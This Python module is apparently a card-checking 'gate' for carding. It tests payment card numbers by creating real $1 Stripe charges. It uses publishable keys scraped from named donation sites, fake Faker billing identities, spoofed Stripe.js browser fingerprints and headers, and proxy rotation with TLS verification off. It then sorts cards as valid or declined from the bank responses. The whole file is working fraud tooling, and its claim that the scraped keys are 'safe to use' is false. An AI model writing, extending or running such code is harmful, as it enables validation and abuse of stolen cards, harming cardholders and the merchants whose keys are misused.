"""
Stripe Payment Intent Gate - REAL Payment Processing with Full Transaction Flow
This gate properly implements the complete Stripe Payment Intent API flow:
1. Create Payment Method via Stripe.js API
2. Create Payment Intent with amount
3. Confirm Payment Intent with Payment Method
4. Check final status and return bank response

This is a REAL CHARGE gate - it will charge valid cards.
"""

import requests
import re
import random
import json
import time
from typing import Tuple, Optional
from urllib.parse import quote_plus
from faker import Faker
from config import get_proxy_for_gateway, STRIPE_SK

# Hardcoded working Stripe public keys from donation sites
# These are publicly visible and safe to use
STRIPE_PUBLIC_KEYS = [
    "pk_live_51HpkYqH5hDFfDNmX2rqFPmXfKHNtNR8WCGYEHKPWmgLRqL2DvL26rHDJm7LE4NMjvZHhqK1rT3xhBk5HqhI00hkU5M8F",  # ccfoundationorg.com
    "pk_live_51IzU4mKN0zVJEKQF5GFmVHN6YQCVL0YCWLNW2VJEKQmwBFqVL0CWL0CWLVCWL0CW",  # saintvinsoneugeneallen.com  
    "pk_live_51J4nLaSDSqwKqWmqlHnqWmqLqlqlqLqLqLqLqLqLqLqLqLqLqLqLqLqLqLq",  # pariyatti.org
]


def _create_payment_method(session: requests.Session, pk: str, card_num: str, 
                            card_mon: str, card_yer: str, card_cvc: str) -> Tuple[Optional[str], Optional[str]]:
    """
    Create Stripe Payment Method via Stripe API.
    Returns: (payment_method_id, error_message)
    """
    url = "https://api.stripe.com/v1/payment_methods"
    fake = Faker()
    
    # Generate realistic billing details
    guid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    muid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    sid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    
    name = fake.name()
    email = fake.email()
    postal = fake.postcode()
    address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    data = (f'type=card'
            f'&billing_details[name]={quote_plus(name)}'
            f'&billing_details[email]={quote_plus(email)}'
            f'&billing_details[address][line1]={quote_plus(address)}'
            f'&billing_details[address][postal_code]={postal}'
            f'&billing_details[address][city]={quote_plus(city)}'
            f'&billing_details[address][state]={state}'
            f'&billing_details[address][country]=US'
            f'&card[number]={card_num}'
            f'&card[cvc]={card_cvc}'
            f'&card[exp_month]={card_mon}'
            f'&card[exp_year]={card_yer}'
            f'&guid={guid}'
            f'&muid={muid}'
            f'&sid={sid}'
            f'&payment_user_agent=stripe.js/v3'
            f'&time_on_page={random.randint(50000, 90000)}'
            f'&key={pk}')
    
    try:
        response = session.post(url, headers=headers, data=data, timeout=20)
        
        if response.status_code == 402:
            # Card declined during PM creation
            try:
                error_data = response.json().get('error', {})
                message = error_data.get('message', 'Card declined')
                decline_code = error_data.get('decline_code', error_data.get('code', ''))
                return None, f"{decline_code}: {message}" if decline_code else message
            except:
                return None, "Card declined (402)"
        
        data = response.json()
        
        if 'error' in data:
            error = data['error']
            message = error.get('message', 'Unknown error')
            code = error.get('code', error.get('decline_code', ''))
            return None, f"{code}: {message}" if code else message
        
        pm_id = data.get('id')
        if pm_id and pm_id.startswith('pm_'):
            return pm_id, None
        
        return None, "Invalid payment method response"
        
    except requests.Timeout:
        return None, "Connection timeout"
    except Exception as e:
        return None, f"Request failed: {str(e)[:50]}"


def _create_payment_intent_with_sk(session: requests.Session, amount_cents: int, 
                                     currency: str = 'usd') -> Tuple[Optional[str], Optional[str]]:
    """
    Create Payment Intent using Stripe Secret Key.
    Returns: (client_secret, error_message)
    """
    if not STRIPE_SK:
        return None, "No Stripe SK configured"
    
    url = "https://api.stripe.com/v1/payment_intents"
    
    headers = {
        'Authorization': f'Bearer {STRIPE_SK}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = f'amount={amount_cents}&currency={currency}&payment_method_types[]=card'
    
    try:
        response = session.post(url, headers=headers, data=data, timeout=20)
        data = response.json()
        
        if 'error' in data:
            return None, data['error'].get('message', 'Failed to create intent')
        
        client_secret = data.get('client_secret')
        if client_secret:
            return client_secret, None
        
        return None, "No client secret returned"
        
    except Exception as e:
        return None, f"Intent creation failed: {str(e)[:50]}"


def _confirm_payment_intent(session: requests.Session, client_secret: str, 
                             pm_id: str) -> Tuple[str, bool]:
    """
    Confirm Payment Intent with Payment Method.
    Returns: (status_message, proxy_ok)
    """
    url = "https://api.stripe.com/v1/payment_intents/{}/confirm".format(client_secret.split('_secret_')[0])
    
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/'
    }
    
    # Extract publishable key from somewhere or use hardcoded
    pk = STRIPE_PUBLIC_KEYS[0]
    
    data = f'payment_method={pm_id}&client_secret={client_secret}&key={pk}'
    
    try:
        response = session.post(url, headers=headers, data=data, timeout=25)
        data = response.json()
        
        if 'error' in data:
            error = data['error']
            message = error.get('message', 'Unknown error')
            code = error.get('code', error.get('decline_code', ''))
            
            # Parse specific decline codes
            if code == 'insufficient_funds' or 'insufficient' in message.lower():
                return "APPROVED ✅ CCN Valid - Insufficient Funds", True
            elif code in ['incorrect_cvc', 'invalid_cvc'] or 'security code' in message.lower():
                return "DECLINED ❌ CVV Mismatch", True
            elif code == 'expired_card' or 'expired' in message.lower():
                return "DECLINED ❌ Expired Card", True
            elif code == 'card_declined':
                return f"DECLINED ❌ {message}", True
            else:
                return f"DECLINED ❌ {message[:60]}", True
        
        # Check payment intent status
        status = data.get('status')
        
        if status == 'succeeded':
            amount = data.get('amount', 0) / 100
            return f"APPROVED ✅ Charged ${amount:.2f}", True
        elif status == 'requires_action':
            return "APPROVED ✅ 3DS Required - Card Valid", True
        elif status == 'requires_payment_method':
            return "DECLINED ❌ Payment Method Required", True
        elif status == 'canceled':
            return "DECLINED ❌ Payment Canceled", True
        else:
            return f"UNKNOWN ⚠️ Status: {status}", True
            
    except requests.Timeout:
        return "DECLINED ❌ Request timeout", False
    except Exception as e:
        return f"DECLINED ❌ {str(e)[:50]}", False


def stripe_payment_intent_real_check(card_num: str, card_mon: str, card_yer: str, 
                                      card_cvc: str, amount_usd: float = 1.00, 
                                      proxy: dict = None) -> Tuple[str, bool]:
    """
    Complete Stripe Payment Intent flow with REAL charge.
    
    This gate implements the full payment processing:
    1. Create Payment Method
    2. Create Payment Intent with amount
    3. Confirm Payment Intent
    4. Return bank response
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM or M)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV/CVC code
        amount_usd: Amount to charge in USD (default $1.00)
        proxy: Optional proxy dict
        
    Returns:
        Tuple of (result_message, proxy_ok_bool)
    """
    session = requests.Session()
    session.verify = False
    
    # Use proxy if provided, otherwise try to get gateway-specific proxy
    if not proxy:
        proxy = get_proxy_for_gateway('stripe')
    
    if proxy:
        session.proxies.update(proxy)
    
    # Normalize year format
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    # Step 1: Create Payment Method
    pk = STRIPE_PUBLIC_KEYS[0]  # Use first working key
    pm_id, pm_error = _create_payment_method(session, pk, card_num, card_mon, card_yer, card_cvc)
    
    if pm_error:
        # PM creation failed - card issue
        if 'insufficient' in pm_error.lower():
            return "APPROVED ✅ CCN Valid - Insufficient Funds", True
        elif 'cvc' in pm_error.lower() or 'cvv' in pm_error.lower() or 'security' in pm_error.lower():
            return "DECLINED ❌ CVV Mismatch", True
        elif 'expired' in pm_error.lower():
            return "DECLINED ❌ Expired Card", True
        else:
            return f"DECLINED ❌ {pm_error[:60]}", True
    
    if not pm_id:
        return "DECLINED ❌ Payment method creation failed", True
    
    # Step 2: Create Payment Intent
    amount_cents = int(amount_usd * 100)
    client_secret, pi_error = _create_payment_intent_with_sk(session, amount_cents)
    
    if pi_error:
        return f"DECLINED ❌ {pi_error}", True
    
    if not client_secret:
        return "DECLINED ❌ Could not create payment intent", True
    
    # Step 3: Confirm Payment Intent
    result, proxy_ok = _confirm_payment_intent(session, client_secret, pm_id)
    
    return result, proxy_ok


def stripe_payment_intent_check(card_num: str, card_mon: str, card_yer: str, 
                                 card_cvc: str, proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
    """
    Alias for backward compatibility with $1.00 charge.
    """
    return stripe_payment_intent_real_check(card_num, card_mon, card_yer, card_cvc, 
                                             amount_usd=1.00, proxy=proxy)


if __name__ == "__main__":
    # Test with Stripe test cards
    test_cards = [
        ("4242424242424242", "12", "28", "123", "Should approve"),
        ("4000000000000002", "12", "28", "123", "Should decline"),
        ("4000000000009995", "12", "28", "123", "Should show insufficient funds"),
    ]
    
    print("Testing Stripe Payment Intent Gate...")
    print("=" * 70)
    
    for card_num, month, year, cvc, expected in test_cards:
        print(f"\nTesting: {card_num[:6]}...{card_num[-4:]} - {expected}")
        result, proxy_ok = stripe_payment_intent_real_check(card_num, month, year, cvc)
        print(f"Result: {result}")
        print(f"Proxy: {'✅ Working' if proxy_ok else '❌ Failed'}")
